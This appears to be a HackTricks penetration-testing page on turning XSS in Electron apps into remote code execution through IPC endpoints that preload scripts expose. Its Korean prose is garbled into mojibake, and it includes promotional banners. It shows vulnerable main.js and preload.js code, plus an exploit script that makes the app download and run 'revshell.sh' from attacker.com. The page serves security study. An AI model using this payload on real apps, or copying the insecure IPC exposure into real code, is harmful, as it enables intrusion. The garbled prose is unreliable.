# Electron contextIsolation RCE via IPC

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

preload ìŠ¤í¬ë¦½íŠ¸ê°€ main.js íŒŒì¼ì—ì„œ IPC ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•˜ë©´, ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ê°€ ì´ë¥¼ ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë©°, ì·¨ì•½ì ì´ ìˆì„ ê²½ìš° RCEê°€ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì´ ì˜ˆì œë“¤ì€ ëŒ€ë¶€ë¶„ ì—¬ê¸°ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). ì¶”ê°€ ì •ë³´ëŠ” ë¹„ë””ì˜¤ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## Example 0

[https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21)ì—ì„œ ê°€ì ¸ì˜¨ ì˜ˆì œ (MS Teamsê°€ XSSì—ì„œ RCEë¡œ ì–´ë–»ê²Œ ì•…ìš©ë˜ì—ˆëŠ”ì§€ì— ëŒ€í•œ ì „ì²´ ì˜ˆì œë¥¼ ìŠ¬ë¼ì´ë“œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë§¤ìš° ê¸°ë³¸ì ì¸ ì˜ˆì œì…ë‹ˆë‹¤):

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## Example 1

`main.js`ê°€ `getUpdate`ë¥¼ ìˆ˜ì‹  ëŒ€ê¸°í•˜ê³  **ì „ë‹¬ëœ ëª¨ë“  URLì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰**í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”.\
ë˜í•œ `preload.js`ê°€ **mainì˜ ëª¨ë“  IPC** ì´ë²¤íŠ¸ë¥¼ ë…¸ì¶œí•˜ëŠ” ë°©ë²•ë„ í™•ì¸í•˜ì„¸ìš”.
```javascript
// Part of code of main.js
ipcMain.on('getUpdate', (event, url) => {
console.log('getUpdate: ' + url)
mainWindow.webContents.downloadURL(url)
mainWindow.download_url = url
});

mainWindow.webContents.session.on('will-download', (event, item, webContents) => {
console.log('downloads path=' + app.getPath('downloads'))
console.log('mainWindow.download_url=' + mainWindow.download_url);
url_parts = mainWindow.download_url.split('/')
filename = url_parts[url_parts.length-1]
mainWindow.downloadPath = app.getPath('downloads') + '/' + filename
console.log('downloadPath=' + mainWindow.downloadPath)
// Set the save path, making Electron not to prompt a save dialog.
item.setSavePath(mainWindow.downloadPath)

item.on('updated', (event, state) => {
if (state === 'interrupted') {
console.log('Download is interrupted but can be resumed')
}
else if (state === 'progressing') {
if (item.isPaused()) console.log('Download is paused')
else console.log(`Received bytes: ${item.getReceivedBytes()}`)
}
})

item.once('done', (event, state) => {
if (state === 'completed') {
console.log('Download successful, running update')
fs.chmodSync(mainWindow.downloadPath, 0755);
var child = require('child_process').execFile;
child(mainWindow.downloadPath, function(err, data) {
if (err) { console.error(err); return; }
console.log(data.toString());
});
}
else console.log(`Download failed: ${state}`)
})
})
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
ì•…ìš©:
```html
<script>
electronSend("getUpdate","https://attacker.com/path/to/revshell.sh");
</script>
```
## Example 2

í”„ë¦¬ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ê°€ ë Œë”ëŸ¬ì— `shell.openExternal`ì„ í˜¸ì¶œí•˜ëŠ” ë°©ë²•ì„ ì§ì ‘ ë…¸ì¶œí•˜ë©´ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
shell.openExternal(url);
};
```
## Example 3

í”„ë¦¬ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ê°€ ë©”ì¸ í”„ë¡œì„¸ìŠ¤ì™€ ì™„ì „íˆ í†µì‹ í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë…¸ì¶œí•˜ë©´, XSSëŠ” ëª¨ë“  ì´ë²¤íŠ¸ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì˜ ì˜í–¥ì€ ë©”ì¸ í”„ë¡œì„¸ìŠ¤ê°€ IPC ì¸¡ë©´ì—ì„œ ë¬´ì—‡ì„ ë…¸ì¶œí•˜ëŠ”ì§€ì— ë”°ë¼ ë‹¬ë¼ì§‘ë‹ˆë‹¤.
```javascript
window.electronListen = (event, cb) => {
ipcRenderer.on(event, cb);
};

window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
